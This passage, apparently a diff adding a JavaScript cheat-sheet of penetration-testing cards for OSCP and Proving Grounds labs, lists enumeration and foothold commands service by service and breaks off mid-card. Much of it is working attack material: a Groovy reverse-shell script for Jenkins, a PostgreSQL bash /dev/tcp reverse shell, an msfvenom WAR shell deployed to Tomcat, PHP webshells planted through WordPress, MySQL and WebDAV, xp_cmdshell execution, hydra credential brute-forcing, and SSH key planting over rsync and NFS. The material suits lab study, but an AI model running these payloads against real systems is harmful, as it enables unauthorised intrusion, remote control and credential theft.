+snmpwalk -v 2c -c public <IP>
+snmpwalk -v 2c -c public <IP> 1.3.6.1.4.1.77.1.2.25  # users
+snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2 # running procs
+snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2 # installed soft
+
+# Hunt for creds in the dump
+snmpwalk -v 2c -c public <IP> | grep -i 'pass\\|cred\\|user'
+
+# Cleaner: snmp-check
+snmp-check <IP> -c public`,
+    cleanup: '',
+    related: ['snmp-rw']
+  },
+  {
+    id: 'rsync-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'rsync/873 — list modules + contents',
+    triggers: ['rsync', '873', 'modules', 'list-only', 'fail walkthrough'],
+    action: 'Step 1: list modules. Step 2: list each module\'s contents. Step 3: try to write. If you can write to a user\'s home, it\'s SSH-key-upload territory (PG Fail).',
+    cmd: `# Step 1 — list modules
+rsync -av --list-only rsync://<IP>/
+
+# Step 2 — list each module contents
+rsync -av --list-only rsync://<IP>/<module>
+
+# Step 3 — pull files for review
+rsync -av rsync://<IP>/<module>/ ./loot/
+
+# Step 4 — test write
+echo test > /tmp/test.txt
+rsync -av /tmp/test.txt rsync://<IP>/<module>/
+# If no error: WRITE ACCESS confirmed → ssh key upload card`,
+    cleanup: 'rm /tmp/test.txt · rm files from share if you do not need them',
+    related: ['rsync-keys']
+  },
+  {
+    id: 'nfs-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'NFS/2049 — showmount + mount',
+    triggers: ['nfs', '2049', 'showmount', 'mount', 'exports', 'no_root_squash'],
+    action: 'showmount -e lists exports. Mount what you can. Check /etc/exports flags via showmount → no_root_squash means you can plant a SUID binary as root (privesc, not foothold, but flag it).',
+    cmd: `# List exports
+showmount -e <IP>
+
+# Mount one (read-only first)
+sudo mkdir /mnt/nfs
+sudo mount -t nfs <IP>:/share /mnt/nfs -o nolock
+
+# Browse
+ls -la /mnt/nfs/
+
+# Check writability
+touch /mnt/nfs/testfile
+# Permission denied = root-squashed
+# Success = no_root_squash → privesc later
+
+# Unmount when done
+sudo umount /mnt/nfs`,
+    cleanup: 'sudo umount /mnt/nfs · rmdir /mnt/nfs',
+    related: ['nfs-mount']
+  },
+  {
+    id: 'redis-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'Redis/6379 — unauth INFO',
+    triggers: ['redis', '6379', 'redis-cli', 'unauth redis', 'no auth', 'readys'],
+    action: 'Redis on the public interface with no auth = game over. INFO gives version + paths. Then either SSH key write or webshell write via CONFIG SET (PG Readys).',
+    cmd: `# Test connection
+redis-cli -h <IP> ping
+# PONG = unauth access
+
+# Banner / version / paths
+redis-cli -h <IP> INFO
+redis-cli -h <IP> INFO server | grep -i 'version\\|dir'
+
+# Useful queries
+redis-cli -h <IP> CONFIG GET dir
+redis-cli -h <IP> CONFIG GET dbfilename
+redis-cli -h <IP> KEYS \\*
+
+# If auth required:
+# Try empty, "foobared" (test default), "redis"
+redis-cli -h <IP> -a foobared INFO`,
+    cleanup: '',
+    related: ['redis-keys']
+  },
+  {
+    id: 'pop3-imap-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'POP3/110 · IMAP/143 — banner + brute',
+    triggers: ['pop3', 'imap', '110', '143', '993', '995', 'mail brute'],
+    action: 'Less common on PG but banner exploits exist. Mostly: cred brute if you have user list.',
+    cmd: `# Banner
+nc -nv <IP> 110
+# USER anything · PASS anything
+
+# Brute
+hydra -L users.txt -P passwords.txt pop3://<IP>
+hydra -L users.txt -P passwords.txt imap://<IP>
+
+# Read mail if creds work
+curl -k --url "imaps://<IP>" --user 'user:pwd'`,
+    cleanup: '',
+    related: ['cred-spray']
+  },
+
+  // ============= WINDOWS / AD SERVICES ENUM =============
+  {
+    id: 'rpc-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'RPC/135 — null bind + enumdomusers',
+    triggers: ['rpc', '135', 'rpcclient', 'enumdomusers', 'null session', 'querydominfo'],
+    action: 'Null session via rpcclient is the most reliable user-enum path. Sometimes returns full user list when SMB null fails.',
+    cmd: `# Connect anonymous
+rpcclient -U "" -N <IP>
+
+# Inside rpcclient prompt:
+rpcclient $> enumdomusers
+rpcclient $> enumdomgroups
+rpcclient $> querydominfo
+rpcclient $> getdompwinfo
+rpcclient $> queryuser <RID>     # detail on one user
+rpcclient $> lookupnames administrator
+
+# RID brute via cme
+crackmapexec smb <IP> -u '' -p '' --rid-brute 4000
+
+# Save output for users.txt
+rpcclient -U "" -N <IP> -c "enumdomusers" | grep -oP '\\[\\K[^]]+' > users.txt`,
+    cleanup: '',
+    related: ['smb-enum', 'rpcclient-reset']
+  },
+  {
+    id: 'smb-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'SMB/445 — null session + enum4linux-ng',
+    triggers: ['smb', '445', '139', 'enum4linux', 'smbclient', 'null session', 'shares'],
+    action: 'enum4linux-ng is the kitchen sink — domain info, users, shares, password policy. smbclient -L tests share access from anon.',
+    cmd: `# Quick null check
+smbclient -L //<IP>/ -N
+crackmapexec smb <IP> -u '' -p '' --shares
+crackmapexec smb <IP> -u 'guest' -p '' --shares
+
+# Full enum
+enum4linux-ng -A <IP> | tee enum4linux.txt
+
+# Try each share by hand
+smbclient //<IP>/<share> -N
+# Inside: recurse on · prompt off · ls
+
+# Authenticated sweep when you have creds
+crackmapexec smb <IP> -u <user> -p '<pwd>' --shares
+crackmapexec smb <IP> -u <user> -p '<pwd>' -M spider_plus`,
+    cleanup: '',
+    related: ['rpc-enum', 'smb-anon-read', 'smb-anon-write']
+  },
+  {
+    id: 'ldap-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'LDAP/389 — anon bind + authed dump',
+    triggers: ['ldap', '389', '636', 'ldapsearch', 'anonymous bind', 'namingcontext'],
+    action: 'RootDSE always returns even anonymous. Gives you the domain DN format for later authenticated queries. If anon bind allows further reads, sometimes user list too.',
+    cmd: `# RootDSE (always works)
+ldapsearch -x -H ldap://<IP> -s base namingcontexts
+
+# Anon search attempt
+ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=local" "(objectClass=user)" | grep sAMAccountName
+
+# Authenticated dump (once you have a user)
+ldapdomaindump -u 'corp\\\\<user>' -p '<pwd>' <IP>
+# Outputs HTML + JSON in cwd — open in browser
+
+# Description field hunt
+ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=local" \\
+  -D '<user>@corp.local' -w '<pwd>' \\
+  "(&(objectClass=user)(description=*))" sAMAccountName description`,
+    cleanup: '',
+    related: ['smb-enum']
+  },
+  {
+    id: 'kerberos-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'Kerberos/88 — kerbrute + clock sync',
+    triggers: ['kerberos', '88', 'kerbrute', 'asrep', 'clock skew', 'krb_ap_err_skew'],
+    action: 'Kerbrute validates usernames via Kerberos pre-auth — no creds needed. Also: sync your clock to the DC IMMEDIATELY or every Kerberos attack will fail with skew errors.',
+    cmd: `# Sync clock FIRST
+sudo rdate -n <DC-IP>
+# or: sudo ntpdate <DC-IP>
+
+# Validate username list
+kerbrute userenum -d corp.local --dc <DC-IP> users.txt -o valid.txt
+
+# AS-REP-roastable list (no creds)
+GetNPUsers.py corp.local/ -no-pass -usersfile valid.txt \\
+  -dc-ip <DC-IP> -format hashcat -outputfile asrep.hashes
+
+# Crack
+hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt`,
+    cleanup: '',
+    related: ['smb-enum', 'cred-spray']
+  },
+  {
+    id: 'winrm-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'WinRM/5985 — cred test',
+    triggers: ['winrm', '5985', '5986', 'evil-winrm', 'powershell remoting'],
+    action: 'Once you have creds, WinRM is the cleanest shell on Windows. Test with cme first — Pwn3d! means local admin.',
+    cmd: `# Cred test sweep
+crackmapexec winrm <IP> -u <user> -p '<pwd>'
+
+# PtH variant
+crackmapexec winrm <IP> -u <user> -H <NT>
+
+# Once confirmed
+evil-winrm -i <IP> -u <user> -p '<pwd>'
+evil-winrm -i <IP> -u <user> -H <NT>
+
+# Built-in upload/download inside evil-winrm
+*Evil-WinRM* PS> upload /home/kali/winpeas.exe C:\\Temp\\winpeas.exe
+*Evil-WinRM* PS> download C:\\loot.txt`,
+    cleanup: '',
+    related: ['winrm-creds', 'cred-spray']
+  },
+  {
+    id: 'rdp-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'RDP/3389 — NLA check + screenshot',
+    triggers: ['rdp', '3389', 'xfreerdp', 'rdesktop', 'nla', 'mstsc'],
+    action: 'rdp-sec-check tells you if NLA is on (no NLA = login screen visible). Screenshot useful — sometimes leaks usernames. Brute is last-resort.',
+    cmd: `# NLA / encryption check
+nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info <IP>
+
+# Screenshot login screen (when NLA off)
+sudo apt install rdesktop-vrdp || scrot
+# Use xfreerdp with /cert:ignore /from-stdin
+xfreerdp /v:<IP> /u:guest /size:1024x768
+
+# Once you have creds
+xfreerdp /v:<IP> /u:<user> /p:'<pwd>' /size:1280x800 /dynamic-resolution /cert:ignore /drive:share,/tmp
+
+# Brute (last resort)
+hydra -L users.txt -P pwd.txt rdp://<IP> -t 4`,
+    cleanup: '',
+    related: ['rdp-login']
+  },
+  {
+    id: 'vnc-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'VNC/5900 — banner + pwd length',
+    triggers: ['vnc', '5900', 'vncviewer', 'realvnc', 'tightvnc'],
+    action: 'VNC pwds are limited to 8 chars (hashcat-friendly). Some old versions had auth bypass CVEs.',
+    cmd: `# Banner
+nmap -sV -p5900 --script vnc-info,vnc-brute <IP>
+
+# Connect
+vncviewer <IP>::5900
+
+# Brute (8-char pwds crack fast)
+hydra -P /usr/share/wordlists/rockyou.txt vnc://<IP>
+
+# CVE check
+searchsploit vnc`,
+    cleanup: '',
+    related: ['searchsploit']
+  },
+  {
+    id: 'netbios-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'NetBIOS/137-139 — nbtscan + workgroup',
+    triggers: ['netbios', '137', '138', '139', 'nbtscan', 'workgroup'],
+    action: 'Old-school but still works — gives workgroup/domain name and netbios computer name. Useful for /etc/hosts.',
+    cmd: `nbtscan -v <IP>
+nmblookup -A <IP>
+
+# Or via nmap
+nmap --script nbstat -p137 <IP>
+
+# Then add to /etc/hosts
+echo "<IP>  <NETBIOS-NAME>.<WORKGROUP> <NETBIOS-NAME>" | sudo tee -a /etc/hosts`,
+    cleanup: '',
+    related: ['smb-enum']
+  },
+
+  // ============= WEB ENUM =============
+  {
+    id: 'http-first',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'HTTP first-pass — whatweb, robots, source',
+    triggers: ['http', '80', '443', 'whatweb', 'robots.txt', 'view source', 'first look'],
+    action: 'Before any directory busting: whatweb for tech stack, /robots.txt for restricted paths, view-source for hidden comments + JS endpoints. 10 minutes of recon saves 1hr of busting.',
+    cmd: `# Tech stack
+whatweb -v http://<IP>/
+curl -sI http://<IP>/ | head -20
+
+# Standard paths
+curl http://<IP>/robots.txt
+curl http://<IP>/sitemap.xml
+curl http://<IP>/.git/HEAD
+curl http://<IP>/.env
+
+# View source — hunt for comments, JS endpoints, version strings
+curl -s http://<IP>/ | grep -E 'TODO|password|api[-_]key|debug'
+
+# Screenshot
+gowitness single -u http://<IP>/
+
+# JS endpoint extract
+curl -s http://<IP>/ | grep -oE 'src="[^"]+\\.js"' | cut -d'"' -f2`,
+    cleanup: '',
+    related: ['http-dir', 'cms-detect', 'source-grep']
+  },
+  {
+    id: 'http-dir',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'Directory busting — feroxbuster + raft + ext',
+    triggers: ['feroxbuster', 'gobuster', 'dirsearch', 'directory bust', 'raft', 'extensions'],
+    action: 'raft wordlist + .php/.html/.txt/.bak/.old extensions = best PG yield. Recursive depth 2-3. Hunt for 200s but also 403/401 (something\'s there).',
+    cmd: `# Standard PG sweep
+feroxbuster -u http://<IP> \\
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
+  -x php,html,txt,bak,old,zip,tar.gz \\
+  -t 50 -d 3 -o ferox.txt
+
+# Recursive into found dirs (auto)
+# .bak and .old are OSCP gold — old backups with creds
+
+# For PHP-specific
+feroxbuster -u http://<IP> \\
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \\
+  -x php,phtml,phps
+
+# Common files (config exposure)
+ffuf -u 'http://<IP>/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -ac`,
+    cleanup: '',
+    related: ['http-first', 'source-grep']
+  },
+  {
+    id: 'http-vhost',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'Vhost / subdomain enum — Host header fuzz',
+    triggers: ['vhost', 'virtual host', 'subdomain', 'ffuf host', 'host header'],
+    action: 'Web server serves different content per Host header. Filter on response size to find vhosts that exist.',
+    cmd: `# Need a base content-length first
+curl -sI -H 'Host: nonexistent.<domain>' http://<IP>/ | wc -c
+
+# Then fuzz
+ffuf -u http://<IP>/ \\
+  -H 'Host: FUZZ.<domain>' \\
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\
+  -fc 404 -fs <baseline-size>
+
+# Add discovered vhosts to /etc/hosts
+echo '<IP>  found.<domain>' | sudo tee -a /etc/hosts
+
+# Then enum the vhost like a separate site
+feroxbuster -u http://found.<domain>/`,
+    cleanup: '',
+    related: ['dns-enum']
+  },
+  {
+    id: 'cms-detect',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'CMS / app fingerprint → version exploit',
+    triggers: ['cms', 'wordpress', 'drupal', 'joomla', 'wpscan', 'whatweb', 'app version'],
+    action: 'Every app has a version-disclosing path. Find it → searchsploit → done. PG has many version-specific RCE boxes (Confluence, GLPI, OpenEMR, FuguHub…).',
+    cmd: `# Standard version-revealing paths
+curl http://<IP>/readme.html
+curl http://<IP>/CHANGELOG
+curl http://<IP>/version.txt
+curl http://<IP>/api/v1/version
+curl http://<IP>/setup.php
+
+# WordPress specific
+wpscan --url http://<IP>/ --enumerate u,p,t --api-token YOUR_TOKEN
+
+# Joomla
+joomscan -u http://<IP>/
+
+# Drupal
+droopescan scan drupal -u http://<IP>/
+
+# Then:
+searchsploit <CMS> <version>`,
+    cleanup: '',
+    related: ['searchsploit', 'public-exploit', 'wordpress']
+  },
+  {
+    id: 'tomcat',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'Tomcat /manager — default creds + WAR',
+    triggers: ['tomcat', 'manager', 'host-manager', 'war', 'jsp shell', '8080'],
+    action: 'Tomcat manager creds are usually default. Once authed, deploy a WAR webshell. Standard pattern on PG.',
+    cmd: `# Check manager exists
+curl -I http://<IP>:8080/manager/html
+curl -I http://<IP>:8080/host-manager/html
+
+# Default creds to try:
+# tomcat:tomcat · admin:admin · admin:tomcat · admin:password
+# tomcat:s3cret · role1:role1
+
+# Brute manager
+hydra -L users.txt -P pwds.txt -f -V http://<IP> http-get /manager/html
+
+# Build WAR shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f war > shell.war
+
+# Deploy via curl
+curl -u tomcat:tomcat --upload-file shell.war \\
+  "http://<IP>:8080/manager/text/deploy?path=/shell&update=true"
+
+# Trigger
+curl http://<IP>:8080/shell/`,
+    cleanup: 'curl -u tomcat:tomcat "http://<IP>:8080/manager/text/undeploy?path=/shell"',
+    related: ['default-creds', 'jenkins']
+  },
+  {
+    id: 'jenkins',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'Jenkins /script — Groovy RCE',
+    triggers: ['jenkins', 'script console', 'groovy', '8080', 'cicd'],
+    action: 'Jenkins script console (/script) executes Groovy as the Jenkins user. Default creds: admin/admin. Path: /script after login.',
+    cmd: `# Check Jenkins exists
+curl -I http://<IP>:8080/
+# Look for X-Jenkins header
+
+# Default creds to try:
+# admin:admin · admin:jenkins · jenkins:jenkins
+
+# Groovy reverse shell (paste in /script):
+String host="<KALI>";int port=4444;String cmd="/bin/bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};
+p.destroy();s.close();
+
+# Catch with nc -lvnp 4444`,
+    cleanup: '',
+    related: ['default-creds', 'tomcat']
+  },
+  {
+    id: 'webdav',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'WebDAV — cadaver + PUT webshell',
+    triggers: ['webdav', 'cadaver', 'put', 'http upload', 'options webdav'],
+    action: 'OPTIONS header revealing PUT/MKCOL = WebDAV. Often allows arbitrary file upload. PHP server + WebDAV write = instant webshell.',
+    cmd: `# Detect
+curl -X OPTIONS http://<IP>/ -i | grep -i 'allow\\|dav'
+# Allow: PUT, DELETE, MKCOL... = WebDAV
+
+# Davtest probes
+davtest -url http://<IP>/
+
+# Manual upload
+curl -X PUT http://<IP>/shell.php --data-binary @shell.php
+
+# Or cadaver
+cadaver http://<IP>/
+# inside: put shell.php
+
+# Trigger
+curl 'http://<IP>/shell.php?cmd=id'`,
+    cleanup: 'curl -X DELETE http://<IP>/shell.php',
+    related: ['upload-bypass']
+  },
+  {
+    id: 'wordpress',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'WordPress — wpscan + plugin/theme upload',
+    triggers: ['wordpress', 'wp', 'wpscan', 'wp-admin', 'plugin upload', 'shenzi'],
+    action: 'Once you have wp-admin, plugin/theme upload gives RCE. xmlrpc.php enables credential brute via system.multicall. (PG Shenzi pattern.)',
+    cmd: `# Enum
+wpscan --url http://<IP>/ --enumerate u,p,t --api-token YOUR_TOKEN
+
+# Brute via xmlrpc.php (faster than /wp-login.php)
+wpscan --url http://<IP>/ -U admin -P /usr/share/wordlists/rockyou.txt
+
+# Once admin:
+# Method 1 — Appearance → Theme Editor → edit 404.php
+# Inject: <?php system($_GET['c']); ?>
+# Trigger: http://<IP>/wp-content/themes/<theme>/404.php?c=id
+
+# Method 2 — Plugins → Upload Plugin → upload PHP-shell .zip
+# Generate:
+echo '<?php system($_GET["c"]); ?>' > shell.php
+zip -r shell.zip shell.php
+# Upload via Plugins page, activate, navigate to:
+# http://<IP>/wp-content/plugins/shell/shell.php?c=id`,
+    cleanup: 'remove edited theme file · delete uploaded plugin via Plugins page',
+    related: ['upload-bypass', 'cms-detect']
+  },
+
+  // ============= DATABASES ENUM =============
+  {
+    id: 'mssql-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'MSSQL/1433 — default creds + impacket',
+    triggers: ['mssql', '1433', 'mssqlclient', 'xp_cmdshell', 'sa', 'sql server'],
+    action: 'sa/sa works more than it should. Once in, xp_cmdshell gives instant RCE (need to enable it first).',
+    cmd: `# Default creds attempt
+crackmapexec mssql <IP> -u sa -p ''
+crackmapexec mssql <IP> -u sa -p 'sa'
+crackmapexec mssql <IP> -u sa -p 'password'
+
+# Login (impacket-mssqlclient)
+impacket-mssqlclient sa:'password'@<IP> -windows-auth
+impacket-mssqlclient corp/<user>:'<pwd>'@<IP> -windows-auth
+
+# Inside SQL prompt — enable xp_cmdshell:
+SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+SQL> xp_cmdshell 'whoami'
+SQL> xp_cmdshell 'powershell -e <base64-revshell>'
+
+# Or impacket shortcut
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami`,
+    cleanup: `SQL> EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;`,
+    related: ['sqli-mssql', 'cred-spray']
+  },
+  {
+    id: 'mysql-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'MySQL/3306 — default creds + INTO OUTFILE',
+    triggers: ['mysql', '3306', 'root', 'into outfile', 'load_file', 'mariadb'],
+    action: 'root with blank pwd common on PG. Once authed, INTO OUTFILE writes a webshell if MySQL has write perms on webroot. load_file reads any file MySQL can read.',
+    cmd: `# Default creds attempt
+mysql -h <IP> -u root
+mysql -h <IP> -u root -proot
+mysql -h <IP> -u root -p''
+
+# Once in:
+mysql> show databases;
+mysql> use <db>;
+mysql> show tables;
+mysql> select * from users;
+
+# Write webshell via INTO OUTFILE
+mysql> select "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php';
+
+# Read /etc/passwd
+mysql> select load_file('/etc/passwd');
+
+# Common webroot paths to try:
+# /var/www/html/ · /var/www/ · /usr/share/nginx/html/ · C:\\xampp\\htdocs\\`,
+    cleanup: 'mysql> delete generated rows · delete shell.php via shell',
+    related: ['sqli-mysql']
+  },
+  {
+    id: 'postgres-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'PostgreSQL/5432 — default creds + COPY PROGRAM',
+    triggers: ['postgres', 'postgresql', '5432', 'copy program', 'psql'],
+    action: 'postgres/postgres or empty. COPY ... FROM PROGRAM is the RCE primitive (postgres 9.3+).',
+    cmd: `# Default attempt
+psql -h <IP> -U postgres
+# blank pwd or 'postgres'
+
+# Once in:
+postgres=> \\l                  # list dbs
+postgres=> \\du                 # list users
+postgres=> SELECT version();
+
+# RCE via COPY FROM PROGRAM (postgres 9.3+)
+postgres=> CREATE TABLE cmd_exec(cmd_output text);
+postgres=> COPY cmd_exec FROM PROGRAM 'id';
+postgres=> SELECT * FROM cmd_exec;
+
+# Reverse shell
+postgres=> COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<KALI>/4444 0>&1"';`,
+    cleanup: 'postgres=> DROP TABLE cmd_exec;',
+    related: ['default-creds']
+  },
+  {
+    id: 'mongo-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'MongoDB/27017 — unauth enum',
+    triggers: ['mongo', 'mongodb', '27017', 'mongo shell', 'nosql'],
+    action: 'Default MongoDB install pre-3.0 binds to 0.0.0.0 with no auth. Dump every db.',
+    cmd: `# Connect unauth
+mongo --host <IP>
+# or older: mongo <IP>:27017
+
+# Inside mongo shell:
+> show dbs
+> use <db>
+> show collections
+> db.<collection>.find()
+> db.users.find()         # almost always a users collection
+> db.<col>.find().pretty()`,
+    cleanup: '',
+    related: ['default-creds']
+  },
+  {
+    id: 'memcached-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'Memcached/11211 — stats + dump',
+    triggers: ['memcached', '11211', 'stats', 'cachedump', 'shifty'],
+    action: 'Unauth memcached lets you read cached objects — sessions, API tokens, occasionally creds. (PG Shifty had a memcached angle.)',
+    cmd: `# Telnet in
+nc -nv <IP> 11211
+# Commands:
+stats
+stats items
+stats cachedump <slab_id> 0
+get <key>
+
+# Or automated
+memcdump --server=<IP>
+memcdump --servers=<IP> | while read key; do
+  echo "$key:" 
+  memccat --servers=<IP> "$key"
+done`,
+    cleanup: '',
+    related: ['searchsploit']
+  },
+  {
+    id: 'oracle-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'Oracle/1521 — odat + default SIDs',
+    triggers: ['oracle', '1521', 'odat', 'tnsping', 'sid'],
+    action: 'Less common on PG but covered for completeness. odat is the swiss army knife.',
+    cmd: `# Detect TNS Listener
+nmap -p1521 --script oracle-tns-version <IP>
+
+# SID brute
+odat sidguesser -s <IP> -p 1521
+
+# Default cred guess on found SID
+odat passwordguesser -s <IP> -p 1521 -d <SID> --accounts-file accounts-pwd.txt
+
+# Once authed → SYSDBA / RCE
+odat dbmsscheduler -s <IP> -p 1521 -d <SID> -U <user> -P <pwd> --exec 'cmd'`,
+    cleanup: '',
+    related: ['default-creds']
+  },
+
+  // ============= FOOTHOLD: ANON READ =============
+  {
+    id: 'ftp-anon-read',
+    phase: 'access', state: 'admin', tags: [],
+    title: 'FTP anon read → hunt creds in files',
+    triggers: ['ftp anon', 'anonymous ftp', 'ftp download', 'creds in files', 'algernon'],
+    action: 'Anonymous FTP usually exposes backup/config files. Download everything, grep for passwords, run exiftool on images, read every text file.',
+    cmd: `# Mirror everything
+wget -m --no-passive ftp://anonymous:anonymous@<IP>
+
+# Or interactive
+ftp -p <IP>
+# user: anonymous · binary · prompt off · mget *
+
+# Grep loot dir
+cd 192.168.*
+grep -ri 'password\\|passwd\\|pwd\\|secret\\|cred' . 2>/dev/null
+grep -ri 'BEGIN.*PRIVATE.*KEY' .
+
+# Exif on images
+exiftool *.jpg *.png 2>/dev/null | grep -i 'creator\\|author\\|owner'
+
+# Hidden text in PDFs
+pdftotext *.pdf
+cat *.txt | grep -iE 'user|password'`,
+    cleanup: '',
+    related: ['ftp-enum', 'source-grep']
+  },
+  {
+    id: 'smb-anon-read',
+    phase: 'access', state: 'admin', tags: [],
+    title: 'SMB anon read → SYSVOL + configs',
+    triggers: ['smb anon read', 'smb null read', 'sysvol', 'guest share', 'public share'],
+    action: 'Even when null-session "doesn\'t work" on the DC, individual shares often read by anonymous. SYSVOL on AD entry boxes always — and contains scripts + GPP cpassword.',
+    cmd: `# Test every share with anon AND guest
+for share in $(smbclient -L //<IP>/ -N 2>/dev/null | grep Disk | awk '{print $1}'); do
+  echo "[+] Testing $share"
+  smbclient //<IP>/$share -N -c 'recurse on; ls' 2>/dev/null
+done
+
+# Manual one share
+smbclient //<IP>/<share> -N
+# inside: recurse on · prompt off · ls · mget *
+
+# SYSVOL specifically (AD entry boxes)
+smbclient //<DC>/SYSVOL -N
+# look for Groups.xml, scripts, anything with cpassword
+
+# Mount for grep
+sudo mkdir /mnt/smb && sudo mount -t cifs //<IP>/<share> /mnt/smb -o guest
+grep -ri 'password\\|cpassword' /mnt/smb/`,
+    cleanup: 'sudo umount /mnt/smb',
+    related: ['smb-enum', 'gpp-decrypt']
+  },
+  {
+    id: 'nfs-mount',
+    phase: 'access', state: 'admin', tags: [],
+    title: 'NFS mount → loot + no_root_squash plant',
+    triggers: ['nfs mount', 'no_root_squash', 'showmount', 'planted suid', 'nfs ssh keys'],
+    action: 'Mounted NFS exposes filesystem as remote. Read for creds/keys. If no_root_squash, you can plant a SUID-root binary that gives shell when triggered (privesc not foothold, but flag).',
+    cmd: `showmount -e <IP>
+
+sudo mkdir /mnt/nfs
+sudo mount -t nfs <IP>:/share /mnt/nfs -o nolock
+
+# Hunt for SSH keys (huge win)
+find /mnt/nfs -name 'id_rsa*' -o -name 'authorized_keys' 2>/dev/null
+find /mnt/nfs -name '.ssh' -type d 2>/dev/null
+
+# If user home is in mount → upload your authorized_keys
+mkdir -p /mnt/nfs/home/<user>/.ssh
+cat ~/.ssh/id_rsa.pub > /mnt/nfs/home/<user>/.ssh/authorized_keys
+ssh -i ~/.ssh/id_rsa <user>@<IP>
+
+# no_root_squash check (test writability as root)
+sudo touch /mnt/nfs/test
+# Success = root not squashed → can plant SUID binary
+# (priv-esc topic, mentioned for awareness)`,
+    cleanup: 'sudo umount /mnt/nfs · remove planted files',
+    related: ['nfs-enum', 'ssh-login']
+  },
+  {
+    id: 'source-grep',
+    phase: 'access', state: 'admin', tags: [],
+    title: 'Source-code / .git / config grep for creds',
+    triggers: ['source code', 'git', 'git-dumper', 'config.php', 'creds in source', '.env'],
+    action: 'Every web app has a config file with DB creds. PHP apps: config.php, wp-config.php. Git exposed: dump and grep. (PG SPX, codo, Apex patterns.)',
+    cmd: `# .git exposure → dump
+git-dumper http://<IP>/.git/ ./git-loot/
+cd git-loot && git log --all --oneline
+git show <commit>  # often has creds removed in newer commits
+
+# Common config paths
+for p in config.php wp-config.php .env config.json settings.py database.yml; do
+  echo "[+] $p:"
+  curl -s http://<IP>/$p
+  echo "---"
+done
+
+# LFI-read a config (if you have LFI)
+curl 'http://<IP>/?file=php://filter/convert.base64-encode/resource=config.php' | base64 -d
+
+# Once you have the file, grep
+grep -E 'password|user|host|database|secret|api[-_]?key' config.php`,
+    cleanup: '',
+    related: ['lfi-poison', 'cred-spray']
+  },
+
+  // ============= FOOTHOLD: ANON WRITE =============
+  {
+    id: 'rsync-keys',
+    phase: 'access', state: 'admin', tags: ['pg10'],
+    title: '⭐ rsync → SSH authorized_keys [PG #10 Fail]',
+    triggers: ['rsync ssh', 'authorized_keys upload', 'fail box', 'rsync writable', 'pg fail'],
+    action: 'Your PG Fail technique. rsync exposes a user home dir with write access → upload your SSH pubkey to .ssh/authorized_keys → log in as that user.',
+    cmd: `# 1. List modules
+rsync -av --list-only rsync://<IP>/
+# fox             fox home
+
+# 2. List module contents — confirm you see user home
+rsync -av --list-only rsync://<IP>/<user>
+
+# 3. Generate keypair (in ~/.ssh)
+cd ~/.ssh
+ssh-keygen -t ed25519 -f id_rsa -N ''
+cat id_rsa.pub > authorized_keys
+
+# 4. Upload .ssh dir via rsync
+rsync -av ~/.ssh/ rsync://<user>@<IP>/<user>/.ssh
+
+# 5. SSH login
+ssh -i ~/.ssh/id_rsa <user>@<IP>
+
+# Reference: PG #10 Fail (your walkthrough)`,
+    cleanup: '# Optionally remove your key from victim ~/.ssh/authorized_keys after pwn',
+    related: ['rsync-enum', 'ssh-login']
+  },
+  {
+    id: 'ftp-anon-write',
+    phase: 'access', state: 'admin', tags: [],
+    title: 'FTP anon write → webshell to webroot',
+    triggers: ['ftp write', 'anon ftp upload', 'webshell upload ftp', 'ftp authby'],
+    action: 'FTP root often == webroot (or has overlap). Upload a webshell, navigate to it via HTTP. (PG AuthBY, Algernon patterns.)',
+    cmd: `# Test write
+ftp -p <IP>
+# user: anonymous
+ftp> put /etc/passwd test.txt
+# Success = writable
+
+# Generate PHP webshell
